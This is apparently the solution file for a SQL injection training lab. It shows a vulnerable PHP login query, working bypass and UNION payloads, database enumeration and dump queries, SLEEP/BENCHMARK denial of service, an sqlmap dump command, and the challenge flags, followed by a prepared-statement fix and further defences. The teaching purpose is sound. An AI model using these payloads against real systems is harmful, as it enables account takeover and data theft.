# SQL Injection: Login Bypass — Solution

> ⚠️ **Spoilers below.** Flags, payloads, and the fix. If you want to solve it
> yourself, close this file and turn the debug dial up instead.

## The vulnerability

`critical.php` builds the authentication query by interpolating the raw POST
fields into a string:

```php
$user = $_POST["username"];
$pass = $_POST["password"];
$sql = "SELECT * FROM `users` WHERE username = '$user' AND password = '$pass'";
$result = $db->query($sql);
```

Anything you type in `username`/`password` becomes *SQL syntax*, not just data.
Set the debug dial to **Debug** (`?debug=2`) to watch the query change as you
type — that is the whole point of this challenge. (**Hints**, `?debug=1`, gives
you the MySQL editors and the raw database error, but not the query.)

## Walkthrough

Payloads go in the **username** field unless noted. Any password works once the
comment (`-- -` or `#`) swallows the rest of the query.

### a) Guess the `test` password

No injection needed — `test` uses the most common password in the world:

```
username: test
password: 123456
```

### b) Log in as admin without the password

Comment out the password check:

```
username: admin' -- -
password: (anything)
```

The query becomes `... WHERE username = 'admin' -- -' AND password = '…'`. The
`-- -` turns the password comparison into a comment. Equivalent classics:
`admin' #` or the tautology `x' OR 1=1 -- -` (logs you in as the first user).

### c) Read the admin password

The page only ever prints the `username` column ("Welcome, `<username>`!"), so
smuggle the secret *into that column* with a `UNION`:

```
username: x' UNION SELECT 1, password, 3 FROM users -- -
password: x
```

`users` has three columns (`id, username, password`), so the `UNION` must select
three values; putting `password` in the middle slot makes it render as the name.

- **Flag (admin password):** `C0n9ratu1ation5!`

### d) Copy the entire database

Enumerate, then exfiltrate. First find what else is there:

```
x' UNION SELECT 1, group_concat(table_name), 3
  FROM information_schema.tables WHERE table_schema = database() -- -
```

That reveals a second table, `hidden`. Read it:

```
x' UNION SELECT 1, text, 3 FROM hidden -- -
```

- **Flag (hidden table):** `5uper5ecret!`

Dump every account in one shot:

```
x' UNION SELECT 1, group_concat(concat_ws('|', id, username, password)), 3
  FROM users -- -
```

### e) Denial of service (carefully)

Make each row cost time or CPU:

```
x' OR SLEEP(5) -- -
```

`SLEEP(5)` runs per evaluated row; scale the number or use
`BENCHMARK(10000000, MD5('a'))` to load the CPU. Keep it small on a shared
machine — the goal is to *observe* the slowdown, not to wedge
your laptop.

### f) The fix

See **The fix** below.

### g) Further defenses

See **Further defenses** below.

## Flags

| Task | What | Value |
|------|------|-------|
| a | `test` password | `123456` |
| c | `admin` password | `C0n9ratu1ation5!` |
| d | `hidden` table secret | `5uper5ecret!` |

## The fix

Separate code from data with a prepared statement, so the input can never be
parsed as SQL. Open the **Fix** editor and replace the body of `critical.php`:

```php
<?php
$user = $_POST["username"];
$pass = $_POST["password"];

$stmt = $db->prepare("SELECT * FROM `users` WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $user, $pass);
$stmt->execute();
$result = $stmt->get_result();
?>
```

Save, then retry every payload above: they now match a literal username like
`admin' -- -` (which does not exist) and fail. **Restore Original** brings the
bug back for the next learner.

## Professional tools

Once you understand the bug by hand, this is exactly what `sqlmap` automates —
it fingerprints the DB, picks a technique (UNION / boolean / time-based), and
dumps everything. Point it at the same POST form (adjust the port to whatever you
mapped with `-p`):

```bash
sqlmap -u "http://localhost:9000/" \
  --data="username=test&password=123456" \
  --purge --batch --dump -v 3
```

- `--data` marks this as a POST and gives sqlmap the injectable parameters.
- `--dump` pulls the tables it can read; `--batch` accepts the defaults; `-v 3`
  prints the payloads so you can compare them to the ones you wrote above.
- Add `--dbs`/`--tables` to browse first, or `-T users --dump` to target one
  table. Raising `--level`/`--risk` tries more payload shapes (from level 2 it
  also tests cookies; from level 3, User-Agent and Referer).

The lesson: the manual payloads teach you *why* it works; `sqlmap` is what you
run on a real engagement once you do.

## Further defenses

Prepared statements (above) are the fix. In depth, also:

- **Least privilege.** This app's DB account is `SELECT`-only, which is why the
  DoS and reads work but writes don't — scope every account to exactly what it
  needs, so an injection can do less.
- **Don't leak internals.** Never show raw SQL errors to users; they hand the
  attacker your query and schema. (The debug view does this on purpose — it is a
  teaching aid, not production behavior.)
- **Never store plaintext passwords.** This DB keeps them in the clear as
  challenge content; a real app stores only salted hashes (`password_hash`), so a
  successful read yields far less.
- **Defense in depth.** Input allow-listing and a WAF are useful compensating
  controls, but they are not a substitute for parameterized queries.
